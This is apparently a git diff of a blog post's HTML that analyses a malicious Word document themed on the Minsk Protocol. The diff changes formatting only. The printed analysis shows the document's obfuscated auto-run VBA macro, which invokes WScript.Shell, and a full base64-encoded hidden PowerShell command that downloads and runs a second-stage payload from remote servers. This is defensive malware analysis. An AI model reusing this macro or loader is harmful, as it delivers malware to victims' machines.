@@ -14,11 +14,11 @@
   content="https://analyze.intezer.com/analyses/1832abdc-0212-4f2b-97af-ec69af2e5a92/genetic-analysis
 https://www.virustotal.com/gui/file/81c7eef54c852dd68050147f77f937933cbff1c22722617180ca386ef55918ab
 SHA256:81c7eef54c852dd68050147f77f937933cbff1c22722617180ca386ef55918ab
-Malicious Word document referencing Minsk Protocol. #  Uses macros to download a second-stage payload from a server.
-Process Tree #  Uses WINWORD to open the file.
+Malicious Word document referencing Minsk Protocol. # Uses macros to download a second-stage payload from a server.
+Process Tree # Uses WINWORD to open the file.
 &amp;#34;C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE&amp;#34; &amp;#34;C:\Users\&amp;lt;USER&amp;gt;\AppData\Local\Temp\&amp;lt;ANALYZED-FILE-NAME&amp;gt;.doc&amp;#34; /q Runs PowerShell base64 encoded command (listed below in a VBA macro)
 Child process from WINWORD launches splwow64
-C:\Windows\splwow64.exe 12288 Details from the file #  Using oleid, VBA macros are found.
+C:\Windows\splwow64.exe 12288 Details from the file # Using oleid, VBA macros are found.
 Next is to use olevba to get more information about the VBA and view the macro code"
 />
 <meta
@@ -53,16 +53,15 @@ Next is to use olevba to get more information about the VBA and view the macro c
 <link href="https://axelarator.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
 
 
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Malicious Word Doc"/>
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Malicious Word Doc"/>
 <meta name="twitter:description" content="https://analyze.intezer.com/analyses/1832abdc-0212-4f2b-97af-ec69af2e5a92/genetic-analysis
 https://www.virustotal.com/gui/file/81c7eef54c852dd68050147f77f937933cbff1c22722617180ca386ef55918ab
 SHA256:81c7eef54c852dd68050147f77f937933cbff1c22722617180ca386ef55918ab
-Malicious Word document referencing Minsk Protocol. #  Uses macros to download a second-stage payload from a server.
-Process Tree #  Uses WINWORD to open the file.
+Malicious Word document referencing Minsk Protocol. # Uses macros to download a second-stage payload from a server.
+Process Tree # Uses WINWORD to open the file.
 &#34;C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE&#34; &#34;C:\Users\&lt;USER&gt;\AppData\Local\Temp\&lt;ANALYZED-FILE-NAME&gt;.doc&#34; /q Runs PowerShell base64 encoded command (listed below in a VBA macro)
 Child process from WINWORD launches splwow64
-C:\Windows\splwow64.exe 12288 Details from the file #  Using oleid, VBA macros are found.
+C:\Windows\splwow64.exe 12288 Details from the file # Using oleid, VBA macros are found.
 Next is to use olevba to get more information about the VBA and view the macro code"/>
 
 
@@ -71,17 +70,16 @@ Next is to use olevba to get more information about the VBA and view the macro c
 <meta property="og:description" content="https://analyze.intezer.com/analyses/1832abdc-0212-4f2b-97af-ec69af2e5a92/genetic-analysis
 https://www.virustotal.com/gui/file/81c7eef54c852dd68050147f77f937933cbff1c22722617180ca386ef55918ab
 SHA256:81c7eef54c852dd68050147f77f937933cbff1c22722617180ca386ef55918ab
-Malicious Word document referencing Minsk Protocol. #  Uses macros to download a second-stage payload from a server.
-Process Tree #  Uses WINWORD to open the file.
+Malicious Word document referencing Minsk Protocol. # Uses macros to download a second-stage payload from a server.
+Process Tree # Uses WINWORD to open the file.
 &#34;C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE&#34; &#34;C:\Users\&lt;USER&gt;\AppData\Local\Temp\&lt;ANALYZED-FILE-NAME&gt;.doc&#34; /q Runs PowerShell base64 encoded command (listed below in a VBA macro)
 Child process from WINWORD launches splwow64
-C:\Windows\splwow64.exe 12288 Details from the file #  Using oleid, VBA macros are found.
+C:\Windows\splwow64.exe 12288 Details from the file # Using oleid, VBA macros are found.
 Next is to use olevba to get more information about the VBA and view the macro code" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://axelarator.github.io/posts/minskdoc/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-07-17T16:25:20-04:00" />
 <meta property="article:modified_time" content="2022-07-17T16:25:20-04:00" /><meta property="og:site_name" content="Axelarator Blog" />
-
 
 
 
@@ -213,58 +211,57 @@ Next is to use olevba to get more information about the VBA and view the macro c
   <a href="#process-tree" class="h-anchor" aria-hidden="true">#</a>
 </h3>
 <p>Uses WINWORD to open the file.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#e6db74">&#34;C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE&#34;</span> <span style="color:#e6db74">&#34;C:\Users\&lt;USER&gt;\AppData\Local\Temp\&lt;ANALYZED-FILE-NAME&gt;.doc&#34;</span> /q
-
-</code></pre></div><p>Runs PowerShell base64 encoded command (listed below in a VBA macro)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#e6db74">&#34;C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE&#34;</span> <span style="color:#e6db74">&#34;C:\Users\&lt;USER&gt;\AppData\Local\Temp\&lt;ANALYZED-FILE-NAME&gt;.doc&#34;</span> /q
+</span></span></code></pre></div><p>Runs PowerShell base64 encoded command (listed below in a VBA macro)</p>
 <p>Child process from WINWORD launches splwow64</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">C:\Windows\splwow64.exe 12288
-</code></pre></div><h3 id="details-from-the-file">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\Windows\splwow64.exe <span style="color:#ae81ff">12288</span>
+</span></span></code></pre></div><h3 id="details-from-the-file">
   Details from the file
   <a href="#details-from-the-file" class="h-anchor" aria-hidden="true">#</a>
 </h3>
 <p>Using <code>oleid</code>, VBA macros are found.</p>
-<p><img src="/Minskdoc/Untitled.png" alt="Untitled"></p>
+<p><img alt="Untitled" src="/Minskdoc/Untitled.png"></p>
 <p>Next is to use <code>olevba</code> to get more information about the VBA and view the macro code</p>
 <h3 id="thisdocumentcls">
   ThisDocument.cls
   <a href="#thisdocumentcls" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<pre><code class="language-visual-basic" data-lang="visual-basic">Private Sub Document_Open()
+<pre tabindex="0"><code class="language-visual-basic" data-lang="visual-basic">Private Sub Document_Open()
     dywcrdwlcikn = UserForm1.TextBox1.Text
-    Set dywcrdwlcikncfp = CreateObject(wfkdhzivnpjutwx(&quot;575363726970742e5368&quot;) &amp; wfkdhzivnpjutwx(&quot;656c6c&quot;))
+    Set dywcrdwlcikncfp = CreateObject(wfkdhzivnpjutwx(&#34;575363726970742e5368&#34;) &amp; wfkdhzivnpjutwx(&#34;656c6c&#34;))
     Set dcptzdqqwnzx = dywcrdwlcikncfp.Exec(dywcrdwlcikn)
 End Sub
 
 Function wfkdhzivnpjutwx(ByVal ankevzfzj As String) As String
 Dim eolvlvdrsa As Long
 For eolvlvdrsa = 1 To Len(ankevzfzj) Step 2
-wfkdhzivnpjutwx = wfkdhzivnpjutwx &amp; Chr$(Val(&quot;&amp;H&quot; &amp; Mid$(ankevzfzj, eolvlvdrsa, 2)))
+wfkdhzivnpjutwx = wfkdhzivnpjutwx &amp; Chr$(Val(&#34;&amp;H&#34; &amp; Mid$(ankevzfzj, eolvlvdrsa, 2)))
 Next eolvlvdrsa
 End Function
-</code></pre><p><img src="/Minskdoc/Untitled%201.png" alt="Untitled"></p>
+</code></pre><p><img alt="Untitled" src="/Minskdoc/Untitled%201.png"></p>
 <p><code>575363726970742e5368</code> is an XOR encoded string. I can use <code>xorsearch</code> to find the memory location and string terminator (0x00) or CyberChef to decode the XOR string.</p>
 <p>When decoded with the appended <code>656c6c</code>, the output is <code>WScript.Shell</code></p>
 <h3 id="userform1frm">
   UserForm1.frm
   <a href="#userform1frm" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<pre><code class="language-visual-basic" data-lang="visual-basic">Private Sub TextBox1_Change()
+<pre tabindex="0"><code class="language-visual-basic" data-lang="visual-basic">Private Sub TextBox1_Change()
 
 End Sub
-</code></pre><p><img src="/Minskdoc/Untitled%202.png" alt="Untitled"></p>
+</code></pre><p><img alt="Untitled" src="/Minskdoc/Untitled%202.png"></p>
 <h3 id="vba-form-string-in-userform1o">
   VBA Form String in UserForm1/o
   <a href="#vba-form-string-in-userform1o" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">powershell.exe -w h -NonI -NoP -noL -enc LgAgACgAIAAkAFAAUwBIAG8ATQBlAFsANABdACsAJABwAFMASABvAG0ARQBbADMANABdACsAJwB4ACcAKQAgACgAIAAoACgAKAAiAHsAMQB9AHsAMwAzAH0AewAxADMAfQB7ADMAMgB9AHsAMwAwAH0AewA5AH0AewA3AH0AewAyADAAfQB7ADEANQB9AHsANQB9AHsAMgA0AH0AewAyADcAfQB7ADIAOQB9AHsAMQA4AH0AewA4AH0AewAzADQAfQB7ADIANQB9AHsAMgB9AHsAMQA3AH0AewAyADgAfQB7ADEAMQB9AHsAMQA2AH0AewAyADIAfQB7ADQAfQB7ADIAMwB9AHsANgB9AHsAMwAxAH0AewAyADEAfQB7ADAAfQB7ADMAfQB7ADIANgB9AHsAMQAyAH0AewAxADkAfQB7ADEAMAB9AHsAMQA0AH0AIgAtAGYAIAAnACsANQAxAG4AcAAxACwAeAA1ADEAbgArADUAMQBuAHAANQAxAG4AKwA1ADEAbgAxADUAMQBuACsANQAxAG4AdwBQAHIAZQBuADUAMQBuACsANQAxAG4AdgA6AHQANQAxAG4AKwA1ADEAbgBlAG0ANQAxAG4AKwA1ADEAbgBwAEMAJwAsACcAJgAgACgAKAB2ACcALAAnAGMAaABvAGkAZwAnACwAJwBOADUAMQBuACsANQAxAG4ASQB1ADUAMQBuACsANQAxAG4AcAA1ADEAbgArADUAMQBuAGQAYQB0ADUAMQBuACsANQAxAG4AZQAuAGUAeABlAHgAcAAxACkAOwBTAHQAYQA1ADEAbgArADUAMQBuAHIAdAA1ADEAbgArADUAMQBuAC0ANQAxAG4AKwA1ADEAbgBQAHIANQAxAG4AKwA1ADEAbgBvAGMAZQBzAHMAIAA1ADEAbgArADUAMQBuAC0ARgBpAGwAZQBwADUAMQBuACsANQAxAG4AYQB0AGgAIAA1ADEAbgArADUAMQBuAHgAcAAxAHcAUAByADUAMQBuACsANQAxAG4AZQBuAHYAOgB0AGUAbQBwAEMATgBJADUAMQAnACwAJwAxAG4AOgBDAHIAZQBhAHQAZQA1ADEAbgArADUAMQBuACgAeABwADEANQAxAG4AKwA1ADEAbgB3ADUAMQBuACsANQAxAG4AUAByAF8ALwBTAG8ANQAxACcALAAnADUAMQBuAC8ANQAxAG4AKwA1ADEAbgAvADUAMQBuACsANQAxAG4AdABhAGkAcwB1AG4AdwBpAG4ALgBjAGwAdQBiAHgAcAAxACwAeABwADUAMQBuACsANQAxAG4AMQBoAHQAdABwAHMAOgAvAC8ANQAxAG4AKwA1ADEAbgB3ACcALAAnAG4AZgB0AHcAYQByAGUAVQBwAGQAYQB0AGUALgBlAHgAZQA1ADEAbgArADUAMQBuAHgAcAA1ADEAbgArADUAMQBuADEAKQAuADUAMQBuACsANQAxAG4ARwBlADUAMQBuACsANQAxAG4AdABSAGUAcwBwAG8AbgBzADUAMQBuACsANQAxAG4AZQAnACwAJwAxAG4AKwA1ADEAbgB0ADUAMQBuACsANQAnACwAJwA4ADgANQAxAG4AKwA1ADEAbgAuADUAMQBuACsANQAxAG4AZgA1ADEAbgArADUAMQBuAHUAbgA1ADEAbgArADUAMQBuAHgAcAA1ADEAbgArADUAMQBuADEALAA1ACcALAAnADUAMQBuAHcAZQBiAC4AcwB1AG4AdgBuAC4AbgBlADUAJwAsACcAUgBlAHAATABhAGMARQAoADUAMQBuAEMATgBJADUAMQBuACwAWwBzAFQAcgBJAE4ARwBdAFsAYwBIAEEAcgAnACwAJwBaAEYAYQAlADUAMQBuACsANQAxAG4AewB3AFAAcgA1ADEAbgArADUAMQBuAGgAdAB0AHAAPQBbADUAMQBuACsANQAxAG4AUwB5ADUAMQBuACsANQAxAG4AcwA1ADEAbgArACcALAAnAF0AMQAyADQAKQAuAFIAZQBwAEwAYQBjAEUAKAA1ADEAbgB3AFAAcgA1ADEAJwAsACcAcgAqADUAMQBuACkALgBuAGEAbQBFAFsAMwAsADEAMQAsADIAXQAtAGoATwBJAG4ANQAxAG4ANQAxAG4AKQAgACgAIAAoADUAMQBuAHcAJwAsACcAXQA5ADIAKQAgACkAJwAsACcAdAA1ADEAbgArADUAMQBuAHQAcABzADoANQAxAG4AKwAnACwAJwA1ADEAbgB0AGUANQAxAG4AKwAnACwAJwBvADgAOAAuAHUAcwA1ADEAbgArADUAMQBuACcALAAnADUAMQBuACcALAAnAG4ALAA1ADEAbgBrADgAeAA1ADEAbgApAC4AUgBlAHAATABhAGMARQAoADUAMQBuAHgAcAAxADUAMQBuACwAWwBzAFQAcgBJAE4ARwBdAFsAYwBIAEEAcgBdADMANAApAC4AJwAsACcAMQBuAHgAcAA1ADEAbgArADUAMQBuADEALAA1ADEAbgArADUAMQBuAHgAcAAxAGgANQAxAG4AKwA1ADEAbgAnACwAJwAxAG4AKwA1ADEAbgAoAHcANQAxAG4AKwA1ADEAbgBQAHIAaAA1ADEAbgArADUAMQBuAHQAdABwADUAMQBuACsANQAxAG4ALgBDAG8ANQAxAG4AKwA1ADEAbgBuAHQAZQBuAHQATAA1ADEAbgArADUAMQBuAGUAbgBnAHQAaAAgAC0AbgBlADUAMQBuACsANQAxAG4AIAAtADEAKQA1ADEAbgArADUAMQBuAHsANQAxAG4AKwA1ADEAbgAoAE4AZQA1ADEAbgArADUAMQBuAHcALQA1ADEAbgArADUAMQBuAE8AYgBqAGUAYwB0ACAAUwA1ADEAbgArADUAMQBuAHkAcwB0AGUANQAxAG4AKwA1ADEAbgBtAC4ATgA1ADEAbgArADUAMQBuAGUAdAA1ADEAbgArADUAMQBuAC4AVwBlAGIANQAxAG4AKwA1ADEAbgBDADUAMQBuACsANQAxAG4AbAA1ADEAbgArADUAMQBuAGkAZQBuAHQANQAxAG4AKwA1ADEAbgApAC4ARABvAHcAbgA1ADEAbgArADUAMQBuAGwAbwBhAGQARgBpAGwAZQAoADUAMQBuACsANQAxAG4AeABwADEAdwA1ADEAbgArADUAMQBuAFAANQAxAG4AKwA1ADEAbgByADUAMQBuACsANQAxAG4AXwAvAHUAcABkADUAMQBuACsANQAxAG4AYQB0AGUALgBlAHgAZQB4ADUAMQBuACcALAAnADUAMQBuAG0ALgBOADUAMQBuACsANQAxAG4AZQB0ADUAMQBuACsANQAxAG4ALgBXAGUAYgA1ADEAbgArADUAMQBuAFIAZQBxAHUAZQA1ADEAbgArADUAMQBuAHMAdABdADoANQAxAG4AKwA1ACcALAAnAG4AKwA1ADEAJwAsACcAZQBiAC4AcwA1ADEAbgArADUAMQBuAHUAbgB3ADUAMQBuACsANQAxAG4AaQA1ADEAbgArADUAMQBuAG4AdgA1ADEAbgArADUAMQBuAG4ALgA1ADEAbgArADUAMQBuAHYAaQBwAHgANQAxAG4AKwA1ADEAbgBwADUAMQBuACsANQAxAG4AMQAsAHgANQAxAG4AKwA1ADEAbgBwADEAJwAsACcAKwA1ADEAbgBwADEANQAxAG4AKwA1ADEAbgBoAHQAdABwADUAMQBuACsANQAxAG4AcwA1ADEAbgArADUAMQBuADoALwAvACcALAAnAG4AKwA1ADEAbgB1AHAANQAxAG4AKwA1ADEAbgBkADUAMQBuACsANQAxAG4AYQB0AGUALgBlADUAMQBuACsANQAxAG4AeABlAHgAcAAxAH0ANQAxAG4AKwA1ADEAbgA7AHcANQAxAG4AKwA1ADEAbgBQAHIAaAA1ADEAbgArADUAMQBuAHQAdABwAC4AYwBsAG8AcwBlADUAMQBuACsANQAxAG4AKAApAH0ANQAxAG4AKQAuAFIAZQBwAEwAYQBjAEUAKAA1ADEAbgAxAFEARAA1ADEAbgAsAFsAcwBUAHIASQBOAEcAXQBbAGMASABBAHIAXQAzADkAKQAuAFIAZQBwAEwAYQBjAEUAKAA1ADEAbgBaAEYAYQA1ADEAbgAsAFsAcwBUAHIASQBOAEcAXQBbAGMASABBAHIAJwAsACcANQAxAG4AKwA1ADEAbgBoAHQANQAxAG4AKwA1ADEAbgAnACwAJwB4AHAAMQApACcALAAnAHQANQAxAG4AKwA1ADEAbgBwADUAMQBuACsANQAxAG4AOgAvAC8AYgAyADkALgA1ADEAbgArADUAMQBuAGIANQAxAG4AKwA1ADEAbgBlADUAMQBuACsANQAxAG4AdAB4ADUAMQBuACsANQAxAG4AcAAxADUAMQBuACsANQAxAG4ALAB4AHAAMQBoAHQAdABwADUAMQBuACsANQAxAG4AcwA6AC8ALwBwAGwAYQB5AGcANQAxAG4AKwA1ADEAbgBvADUAMQBuACsAJwAsACcAMQBuAEQANQAxAG4AKwA1ADEAbgBTAGkAbABlAG4AdABsAHkAQwA1ADEAbgArADUAMQBuAG8AbgB0AGkAbgA1ADEAbgArADUAMQBuAHUAZQAxADUAMQBuACsANQAxAG4AUQBEADsAQAAoAHgAcAA1ADEAbgArADUAMQBuADEANQAxAG4AKwA1ADEAbgBoADUAMQBuACsANQAxAG4AdAB0AHAAcwA1ADEAbgArADUAMQBuADoALwAvADUAMQBuACsAJwAsACcANQAxAG4AKwA1ADEAbgAoACkANQAxAG4AKwA1ADEAbgA7AGkANQAxAG4AKwA1ADEAbgBmADUAJwAsACcAUAByAEUAcgByADUAMQBuACsANQAxAG4AbwA1ADEAbgArADUAMQBuAHIAQQBjAHQAaQA1ADEAbgArADUAMQBuAG8AbgBQAHIANQAxAG4AKwA1ADEAbgBlAGYAZQByAGUAbgA1ADEAbgArADUAMQBuAGMANQAxAG4AKwA1ADEAbgBlAD0AMQBRADUAMQBuACsANQAnACwAJwBhAFIASQBBAGIAbABFACAANQAxAG4AKgBNAGQAJwAsACcAMQBuACsANQAxAG4AeAA1ADEAbgAnACkAKQAgACAALQBjAFIARQBQAGwAQQBDAGUAIAAnAGsAOAB4ACcALABbAEMAaABBAFIAXQAzADYALQBjAFIARQBQAGwAQQBDAGUAKABbAEMAaABBAFIAXQA1ADMAKwBbAEMAaABBAFIAXQA0ADkAKwBbAEMAaABBAFIAXQAxADEAMAApACwAWwBDAGgAQQBSAF0AMwA5ACkAKQA<span style="color:#f92672">=</span>
-</code></pre></div><p><img src="/Minskdoc/Untitled%203.png" alt="Untitled"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>powershell.exe -w h -NonI -NoP -noL -enc LgAgACgAIAAkAFAAUwBIAG8ATQBlAFsANABdACsAJABwAFMASABvAG0ARQBbADMANABdACsAJwB4ACcAKQAgACgAIAAoACgAKAAiAHsAMQB9AHsAMwAzAH0AewAxADMAfQB7ADMAMgB9AHsAMwAwAH0AewA5AH0AewA3AH0AewAyADAAfQB7ADEANQB9AHsANQB9AHsAMgA0AH0AewAyADcAfQB7ADIAOQB9AHsAMQA4AH0AewA4AH0AewAzADQAfQB7ADIANQB9AHsAMgB9AHsAMQA3AH0AewAyADgAfQB7ADEAMQB9AHsAMQA2AH0AewAyADIAfQB7ADQAfQB7ADIAMwB9AHsANgB9AHsAMwAxAH0AewAyADEAfQB7ADAAfQB7ADMAfQB7ADIANgB9AHsAMQAyAH0AewAxADkAfQB7ADEAMAB9AHsAMQA0AH0AIgAtAGYAIAAnACsANQAxAG4AcAAxACwAeAA1ADEAbgArADUAMQBuAHAANQAxAG4AKwA1ADEAbgAxADUAMQBuACsANQAxAG4AdwBQAHIAZQBuADUAMQBuACsANQAxAG4AdgA6AHQANQAxAG4AKwA1ADEAbgBlAG0ANQAxAG4AKwA1ADEAbgBwAEMAJwAsACcAJgAgACgAKAB2ACcALAAnAGMAaABvAGkAZwAnACwAJwBOADUAMQBuACsANQAxAG4ASQB1ADUAMQBuACsANQAxAG4AcAA1ADEAbgArADUAMQBuAGQAYQB0ADUAMQBuACsANQAxAG4AZQAuAGUAeABlAHgAcAAxACkAOwBTAHQAYQA1ADEAbgArADUAMQBuAHIAdAA1ADEAbgArADUAMQBuAC0ANQAxAG4AKwA1ADEAbgBQAHIANQAxAG4AKwA1ADEAbgBvAGMAZQBzAHMAIAA1ADEAbgArADUAMQBuAC0ARgBpAGwAZQBwADUAMQBuACsANQAxAG4AYQB0AGgAIAA1ADEAbgArADUAMQBuAHgAcAAxAHcAUAByADUAMQBuACsANQAxAG4AZQBuAHYAOgB0AGUAbQBwAEMATgBJADUAMQAnACwAJwAxAG4AOgBDAHIAZQBhAHQAZQA1ADEAbgArADUAMQBuACgAeABwADEANQAxAG4AKwA1ADEAbgB3ADUAMQBuACsANQAxAG4AUAByAF8ALwBTAG8ANQAxACcALAAnADUAMQBuAC8ANQAxAG4AKwA1ADEAbgAvADUAMQBuACsANQAxAG4AdABhAGkAcwB1AG4AdwBpAG4ALgBjAGwAdQBiAHgAcAAxACwAeABwADUAMQBuACsANQAxAG4AMQBoAHQAdABwAHMAOgAvAC8ANQAxAG4AKwA1ADEAbgB3ACcALAAnAG4AZgB0AHcAYQByAGUAVQBwAGQAYQB0AGUALgBlAHgAZQA1ADEAbgArADUAMQBuAHgAcAA1ADEAbgArADUAMQBuADEAKQAuADUAMQBuACsANQAxAG4ARwBlADUAMQBuACsANQAxAG4AdABSAGUAcwBwAG8AbgBzADUAMQBuACsANQAxAG4AZQAnACwAJwAxAG4AKwA1ADEAbgB0ADUAMQBuACsANQAnACwAJwA4ADgANQAxAG4AKwA1ADEAbgAuADUAMQBuACsANQAxAG4AZgA1ADEAbgArADUAMQBuAHUAbgA1ADEAbgArADUAMQBuAHgAcAA1ADEAbgArADUAMQBuADEALAA1ACcALAAnADUAMQBuAHcAZQBiAC4AcwB1AG4AdgBuAC4AbgBlADUAJwAsACcAUgBlAHAATABhAGMARQAoADUAMQBuAEMATgBJADUAMQBuACwAWwBzAFQAcgBJAE4ARwBdAFsAYwBIAEEAcgAnACwAJwBaAEYAYQAlADUAMQBuACsANQAxAG4AewB3AFAAcgA1ADEAbgArADUAMQBuAGgAdAB0AHAAPQBbADUAMQBuACsANQAxAG4AUwB5ADUAMQBuACsANQAxAG4AcwA1ADEAbgArACcALAAnAF0AMQAyADQAKQAuAFIAZQBwAEwAYQBjAEUAKAA1ADEAbgB3AFAAcgA1ADEAJwAsACcAcgAqADUAMQBuACkALgBuAGEAbQBFAFsAMwAsADEAMQAsADIAXQAtAGoATwBJAG4ANQAxAG4ANQAxAG4AKQAgACgAIAAoADUAMQBuAHcAJwAsACcAXQA5ADIAKQAgACkAJwAsACcAdAA1ADEAbgArADUAMQBuAHQAcABzADoANQAxAG4AKwAnACwAJwA1ADEAbgB0AGUANQAxAG4AKwAnACwAJwBvADgAOAAuAHUAcwA1ADEAbgArADUAMQBuACcALAAnADUAMQBuACcALAAnAG4ALAA1ADEAbgBrADgAeAA1ADEAbgApAC4AUgBlAHAATABhAGMARQAoADUAMQBuAHgAcAAxADUAMQBuACwAWwBzAFQAcgBJAE4ARwBdAFsAYwBIAEEAcgBdADMANAApAC4AJwAsACcAMQBuAHgAcAA1ADEAbgArADUAMQBuADEALAA1ADEAbgArADUAMQBuAHgAcAAxAGgANQAxAG4AKwA1ADEAbgAnACwAJwAxAG4AKwA1ADEAbgAoAHcANQAxAG4AKwA1ADEAbgBQAHIAaAA1ADEAbgArADUAMQBuAHQAdABwADUAMQBuACsANQAxAG4ALgBDAG8ANQAxAG4AKwA1ADEAbgBuAHQAZQBuAHQATAA1ADEAbgArADUAMQBuAGUAbgBnAHQAaAAgAC0AbgBlADUAMQBuACsANQAxAG4AIAAtADEAKQA1ADEAbgArADUAMQBuAHsANQAxAG4AKwA1ADEAbgAoAE4AZQA1ADEAbgArADUAMQBuAHcALQA1ADEAbgArADUAMQBuAE8AYgBqAGUAYwB0ACAAUwA1ADEAbgArADUAMQBuAHkAcwB0AGUANQAxAG4AKwA1ADEAbgBtAC4ATgA1ADEAbgArADUAMQBuAGUAdAA1ADEAbgArADUAMQBuAC4AVwBlAGIANQAxAG4AKwA1ADEAbgBDADUAMQBuACsANQAxAG4AbAA1ADEAbgArADUAMQBuAGkAZQBuAHQANQAxAG4AKwA1ADEAbgApAC4ARABvAHcAbgA1ADEAbgArADUAMQBuAGwAbwBhAGQARgBpAGwAZQAoADUAMQBuACsANQAxAG4AeABwADEAdwA1ADEAbgArADUAMQBuAFAANQAxAG4AKwA1ADEAbgByADUAMQBuACsANQAxAG4AXwAvAHUAcABkADUAMQBuACsANQAxAG4AYQB0AGUALgBlAHgAZQB4ADUAMQBuACcALAAnADUAMQBuAG0ALgBOADUAMQBuACsANQAxAG4AZQB0ADUAMQBuACsANQAxAG4ALgBXAGUAYgA1ADEAbgArADUAMQBuAFIAZQBxAHUAZQA1ADEAbgArADUAMQBuAHMAdABdADoANQAxAG4AKwA1ACcALAAnAG4AKwA1ADEAJwAsACcAZQBiAC4AcwA1ADEAbgArADUAMQBuAHUAbgB3ADUAMQBuACsANQAxAG4AaQA1ADEAbgArADUAMQBuAG4AdgA1ADEAbgArADUAMQBuAG4ALgA1ADEAbgArADUAMQBuAHYAaQBwAHgANQAxAG4AKwA1ADEAbgBwADUAMQBuACsANQAxAG4AMQAsAHgANQAxAG4AKwA1ADEAbgBwADEAJwAsACcAKwA1ADEAbgBwADEANQAxAG4AKwA1ADEAbgBoAHQAdABwADUAMQBuACsANQAxAG4AcwA1ADEAbgArADUAMQBuADoALwAvACcALAAnAG4AKwA1ADEAbgB1AHAANQAxAG4AKwA1ADEAbgBkADUAMQBuACsANQAxAG4AYQB0AGUALgBlADUAMQBuACsANQAxAG4AeABlAHgAcAAxAH0ANQAxAG4AKwA1ADEAbgA7AHcANQAxAG4AKwA1ADEAbgBQAHIAaAA1ADEAbgArADUAMQBuAHQAdABwAC4AYwBsAG8AcwBlADUAMQBuACsANQAxAG4AKAApAH0ANQAxAG4AKQAuAFIAZQBwAEwAYQBjAEUAKAA1ADEAbgAxAFEARAA1ADEAbgAsAFsAcwBUAHIASQBOAEcAXQBbAGMASABBAHIAXQAzADkAKQAuAFIAZQBwAEwAYQBjAEUAKAA1ADEAbgBaAEYAYQA1ADEAbgAsAFsAcwBUAHIASQBOAEcAXQBbAGMASABBAHIAJwAsACcANQAxAG4AKwA1ADEAbgBoAHQANQAxAG4AKwA1ADEAbgAnACwAJwB4AHAAMQApACcALAAnAHQANQAxAG4AKwA1ADEAbgBwADUAMQBuACsANQAxAG4AOgAvAC8AYgAyADkALgA1ADEAbgArADUAMQBuAGIANQAxAG4AKwA1ADEAbgBlADUAMQBuACsANQAxAG4AdAB4ADUAMQBuACsANQAxAG4AcAAxADUAMQBuACsANQAxAG4ALAB4AHAAMQBoAHQAdABwADUAMQBuACsANQAxAG4AcwA6AC8ALwBwAGwAYQB5AGcANQAxAG4AKwA1ADEAbgBvADUAMQBuACsAJwAsACcAMQBuAEQANQAxAG4AKwA1ADEAbgBTAGkAbABlAG4AdABsAHkAQwA1ADEAbgArADUAMQBuAG8AbgB0AGkAbgA1ADEAbgArADUAMQBuAHUAZQAxADUAMQBuACsANQAxAG4AUQBEADsAQAAoAHgAcAA1ADEAbgArADUAMQBuADEANQAxAG4AKwA1ADEAbgBoADUAMQBuACsANQAxAG4AdAB0AHAAcwA1ADEAbgArADUAMQBuADoALwAvADUAMQBuACsAJwAsACcANQAxAG4AKwA1ADEAbgAoACkANQAxAG4AKwA1ADEAbgA7AGkANQAxAG4AKwA1ADEAbgBmADUAJwAsACcAUAByAEUAcgByADUAMQBuACsANQAxAG4AbwA1ADEAbgArADUAMQBuAHIAQQBjAHQAaQA1ADEAbgArADUAMQBuAG8AbgBQAHIANQAxAG4AKwA1ADEAbgBlAGYAZQByAGUAbgA1ADEAbgArADUAMQBuAGMANQAxAG4AKwA1ADEAbgBlAD0AMQBRADUAMQBuACsANQAnACwAJwBhAFIASQBBAGIAbABFACAANQAxAG4AKgBNAGQAJwAsACcAMQBuACsANQAxAG4AeAA1ADEAbgAnACkAKQAgACAALQBjAFIARQBQAGwAQQBDAGUAIAAnAGsAOAB4ACcALABbAEMAaABBAFIAXQAzADYALQBjAFIARQBQAGwAQQBDAGUAKABbAEMAaABBAFIAXQA1ADMAKwBbAEMAaABBAFIAXQA0ADkAKwBbAEMAaABBAFIAXQAxADEAMAApACwAWwBDAGgAQQBSAF0AMwA5ACkAKQA<span style="color:#f92672">=</span>
+</span></span></code></pre></div><p><img alt="Untitled" src="/Minskdoc/Untitled%203.png"></p>
 <p>Decoded output</p>
